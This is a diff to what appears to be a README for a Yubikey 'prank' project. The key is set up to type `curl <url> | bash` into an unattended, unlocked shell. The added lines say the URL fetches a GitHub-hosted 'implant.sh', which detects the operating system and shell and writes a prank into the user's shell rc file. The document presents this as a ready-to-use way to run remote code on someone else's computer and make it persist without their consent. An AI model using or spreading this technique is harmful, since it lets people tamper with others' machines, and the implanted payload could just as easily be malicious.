@@ -13,5 +13,8 @@ As I have a spare Yubikey I decided to utilise a slot with a static string.  Thi
 
 ` curl <url-shortened> | bash`
 
+The URL shortener is used as the Yubikey has a limit of 64 characters in it's static password mode.  The shortened URL shoudl point to 
+`https://raw.githubusercontent.com/auraltension/unlocked-prank/master/implant.sh`
+
 Open a shell, plug in, press the button, remove, walk away.  The script will determine whether the system is Mac or
 linux, and then the shell used by the user and implant a fun prank into their shell rc.
